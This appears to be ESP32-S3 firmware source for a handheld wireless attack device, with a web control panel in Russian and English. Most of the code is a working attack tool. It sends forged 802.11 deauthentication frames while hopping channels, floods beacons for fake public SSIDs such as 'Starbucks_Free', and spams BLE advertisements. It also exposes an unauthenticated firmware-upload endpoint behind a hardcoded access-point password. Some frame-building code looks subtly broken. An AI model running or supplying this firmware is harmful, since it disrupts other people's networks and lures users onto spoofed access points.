#include <WiFi.h>
#include <WebServer.h>
#include <LittleFS.h>
#include <Update.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <esp_wifi.h>
#include <esp_random.h>
#include <ArduinoJson.h>

// ================= ПИНЫ =================
#define TFT_CS   14
#define TFT_DC   15
#define TFT_RST  16
#define TFT_BL   48
#define TFT_SCK  12
#define TFT_MOSI 13
#define BTN_NEXT 1
#define BTN_SEL  2

WebServer server(80);
bool wifiDeauthOn = false;
bool bleSpamOn = false;
bool beaconSpamOn = false;
unsigned long lastDeauth = 0, lastBle = 0;
int currentChannel = 1;
const int channels[] = {1, 6, 11, 3, 9}; // 5 каналов в секунду
const int numChannels = 5;

// Список SSID для бекона
String beaconSSIDs[20];
int beaconCount = 0;

// Deauth frame
uint8_t deauthFrame[26] = {
  0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xf0, 0xff, 0x02, 0x00
};

const char* index_html = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>ESP32-S3 OS v2</title><style>
body{background:#0f172a;color:#e2e8f0;font-family:system-ui,sans-serif;text-align:center;padding:20px;margin:0;}
.card{background:#1e293b;padding:20px;border-radius:12px;margin:15px auto;max-width:500px;box-shadow:0 4px 6px rgba(0,0,0,0.3);}
h1{color:#38bdf8;margin-bottom:5px;} .status{font-size:16px;color:#4ade80;margin:10px 0;line-height:1.6;}
.btn{background:#3b82f6;color:#fff;padding:12px 24px;border:none;border-radius:8px;font-size:16px;margin:5px;cursor:pointer;}
.btn.stop{background:#ef4444;} .btn:active{transform:scale(0.98);}
input[type="file"],textarea{margin:10px 0;width:100%;padding:8px;border-radius:6px;border:1px solid #475569;background:#0f172a;color:#fff;}
.bar{width:100%;height:8px;background:#334155;border-radius:4px;margin:10px 0;overflow:hidden;}.bar div{height:100%;background:#22d3ee;width:0%;transition:width 0.2s;}
label{display:block;margin:10px 0 5px;color:#94a3b8;text-align:left;}
</style></head><body>
<div class="card"><h1>🛡️ ESP32-S3 OS v2</h1>
<div class="status" id="st">⏳ Загрузка...</div></div>

<div class="card">
  <h3>📡 WiFi Атаки</h3>
  <button class="btn" onclick="cmd('deauth','on')">▶ Deauth (5 ch/s)</button>
  <button class="btn stop" onclick="cmd('deauth','off')">⏹ Stop</button><br>
  <button class="btn" onclick="cmd('beacon','on')">▶ Beacon Spam</button>
  <button class="btn stop" onclick="cmd('beacon','off')">⏹ Stop</button>
</div>

<div class="card">
  <h3>🦷 BLE Spam</h3>
  <button class="btn" onclick="cmd('ble','on')">▶ Запустить</button>
  <button class="btn stop" onclick="cmd('ble','off')">⏹ Остановить</button>
</div>

<div class="card">
  <h3>📝 Beacon SSID List (JSON)</h3>
  <label>Формат: {"ssids":["WiFi1","WiFi2","Free_WiFi"]}</label>
  <textarea id="ssidlist" rows="3" placeholder='{"ssids":["Home_WiFi","Office","Starbucks_Free"]}'></textarea><br>
  <button class="btn" onclick="saveBeacons()">💾 Сохранить список</button>
</div>

<div class="card">
  <h3>📂 Загрузка файлов</h3>
  <input type="file" id="f"><br>
  <button class="btn" onclick="up()">📤 Отправить</button>
  <div class="bar"><div id="p"></div></div>
  <p id="m" style="font-size:14px;color:#94a3b8;"></p>
</div>

<script>
function ref(){fetch('/api/st').then(r=>r.json()).then(d=>{
  document.getElementById('st').innerHTML=`📶 Deauth: ${d.deauth}<br>📡 Beacon: ${d.beacon}<br>🦷 BLE: ${d.ble}<br>📊 Канал: ${d.ch}<br>💾 Heap: ${d.heap}KB<br>📁 SSIDs: ${d.ssidcount}`;
});}
function cmd(m,a){fetch(`/api/cmd?m=${m}&a=${a}`).then(r=>r.text()).then(t=>{document.getElementById('m').innerText=t;ref();});}
function saveBeacons(){let json=document.getElementById('ssidlist').value;
  fetch('/api/beacons',{method:'POST',headers:{'Content-Type':'application/json'},body:json})
  .then(r=>r.text()).then(t=>{document.getElementById('m').innerText=t;ref();});}
function up(){let f=document.getElementById('f').files[0];if(!f)return;
let fd=new FormData();fd.append('file',f);let x=new XMLHttpRequest();
x.open('POST','/up');x.upload.onprogress=e=>{if(e.lengthComputable)document.getElementById('p').style.width=(e.loaded/e.total*100)+'%';};
x.onload=()=>{document.getElementById('m').innerText=x.status==200?'✅ Готово!':'❌ Ошибка';ref();};
x.send(fd);}
setInterval(ref,1500);ref();
</script></body></html>)rawliteral";

void setup() {
  Serial.begin(115200);
  pinMode(BTN_NEXT, INPUT_PULLUP);
  pinMode(BTN_SEL, INPUT_PULLUP);
  pinMode(TFT_BL, OUTPUT); digitalWrite(TFT_BL, HIGH);

  if (!LittleFS.begin(true)) { Serial.println("LittleFS Error"); }

  loadBeaconList();

  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP("ESP32-OS", "12345678", 1);
  esp_wifi_set_promiscuous(true);
  
  Serial.print("AP IP: "); Serial.println(WiFi.softAPIP());

  server.on("/", []() { server.send(200, "text/html", index_html); });
  server.on("/api/st", handleStatus);
  server.on("/api/cmd", handleCmd);
  server.on("/api/beacons", handleBeaconsSave, HTTP_POST);
  server.on("/up", HTTP_POST, []() { server.send(200, "text/plain", "OK"); }, handleUpload);
  server.begin();

  BLEDevice::init("ESP32-OS");
  Serial.println("🚀 System Ready - 5 ch/s + Beacon Spam");
}

void loop() {
  server.handleClient();
  runAttacks();
  if (digitalRead(BTN_SEL) == LOW) { delay(200); Serial.println("BTN_SEL"); }
  if (digitalRead(BTN_NEXT) == LOW) { delay(200); Serial.println("BTN_NEXT"); }
}

void loadBeaconList() {
  File f = LittleFS.open("/beacons.json", "r");
  if (!f) {
    beaconSSIDs[0] = "Home_WiFi";
    beaconSSIDs[1] = "Office_Network";
    beaconSSIDs[2] = "Starbucks_Free";
    beaconSSIDs[3] = "McDonalds_Free_WiFi";
    beaconSSIDs[4] = "Airport_WiFi";
    beaconCount = 5;
    return;
  }
  
  String json = f.readString();
  f.close();  
  DynamicJsonDocument doc(1024);
  DeserializationError err = deserializeJson(doc, json);
  if (err) { Serial.println("JSON parse error"); return; }
  
  JsonArray ssids = doc["ssids"];
  beaconCount = 0;
  for (JsonObject ssid : ssids) {
    if (beaconCount < 20) {
      beaconSSIDs[beaconCount++] = ssid.as<String>();
    }
  }
  Serial.print("Loaded "); Serial.print(beaconCount); Serial.println(" SSIDs");
}

void sendBeacon(const char* ssid) {
  uint8_t beacon[] = {
    0x80, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x00, 0x00,
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
    0x00,
    0x00,
  };
  
  for (int i = 4; i < 10; i++) beacon[i] = esp_random() & 0xFF;
  for (int i = 10; i < 16; i++) beacon[i] = beacon[i-6];
  
  int ssidLen = strlen(ssid);
  uint8_t fullBeacon[64];
  memcpy(fullBeacon, beacon, 16);
  fullBeacon[16] = ssidLen;
  memcpy(&fullBeacon[17], ssid, ssidLen);
  
  esp_wifi_80211_tx(WIFI_IF_AP, fullBeacon, 17 + ssidLen, false);
}

void runAttacks() {
  unsigned long now = millis();

  if (wifiDeauthOn) {
    static int chIndex = 0;
    static unsigned long lastSwitch = 0;
    
    if (now - lastSwitch > 200) {
      lastSwitch = now;      currentChannel = channels[chIndex];
      esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
      chIndex = (chIndex + 1) % numChannels;
    }
    
    for (int i = 6; i < 12; i++) deauthFrame[i] = esp_random() & 0xFF;
    for (int i = 10; i < 16; i++) deauthFrame[i] = esp_random() & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, 26, false);
    yield();
  }

  if (beaconSpamOn) {
    static unsigned long lastBeacon = 0;
    static int ssidIndex = 0;
    
    if (now - lastBeacon > 100) {
      lastBeacon = now;
      if (beaconCount > 0) {
        sendBeacon(beaconSSIDs[ssidIndex].c_str());
        ssidIndex = (ssidIndex + 1) % beaconCount;
      }
    }
    yield();
  }

  if (bleSpamOn && now - lastBle > 100) {
    lastBle = now;
    BLEAdvertising* pAdv = BLEDevice::getAdvertising();
    pAdv->stop();
    pAdv->addServiceUUID(BLEUUID((uint16_t)(0x1800 + (esp_random() % 0x20))));
    pAdv->setMinPreferred(0x06);
    pAdv->setMaxPreferred(0x12);
    pAdv->start();
    yield();
  }
}

void handleStatus() {
  String j = "{\"deauth\":\"" + String(wifiDeauthOn?"ON":"OFF") + 
             "\",\"beacon\":\"" + String(beaconSpamOn?"ON":"OFF") +
             "\",\"ble\":\"" + String(bleSpamOn?"ON":"OFF") +
             "\",\"ch\":" + String(currentChannel) +
             ",\"heap\":" + String(ESP.getFreeHeap()/1024) +
             ",\"ssidcount\":" + String(beaconCount) + "}";
  server.send(200, "application/json", j);
}

void handleCmd() {
  String m = server.arg("m"), a = server.arg("a");
  if (m == "deauth") wifiDeauthOn = (a == "on");  else if (m == "ble") bleSpamOn = (a == "on");
  else if (m == "beacon") beaconSpamOn = (a == "on");
  server.send(200, "text/plain", "✅ OK");
}

void handleBeaconsSave() {
  String json = server.arg("plain");
  File f = LittleFS.open("/beacons.json", "w");
  if (f) {
    f.print(json);
    f.close();
    loadBeaconList();
    server.send(200, "text/plain", "✅ Сохранено!");
  } else {
    server.send(500, "text/plain", "❌ Ошибка записи");
  }
}

void handleUpload() {
  HTTPUpload& up = server.upload();
  static File f;
  if (up.status == UPLOAD_FILE_START) {
    String name = "/" + up.filename;
    if (up.filename.endsWith(".bin")) {
      if (!Update.begin(UPDATE_SIZE_UNKNOWN, U_FLASH)) Update.printError(Serial);
    } else {
      f = LittleFS.open(name, "w");
    }
  } else if (up.status == UPLOAD_FILE_WRITE) {
    if (up.filename.endsWith(".bin")) {
      if (Update.write(up.buf, up.currentSize) != up.currentSize) Update.printError(Serial);
    } else {
      if (f) f.write(up.buf, up.currentSize);
    }
  } else if (up.status == UPLOAD_FILE_END) {
    if (up.filename.endsWith(".bin")) {
      if (Update.end(true)) { Serial.println("🔄 OTA Success"); ESP.restart(); }
    } else {
      if (f) f.close();
    }
  }
}
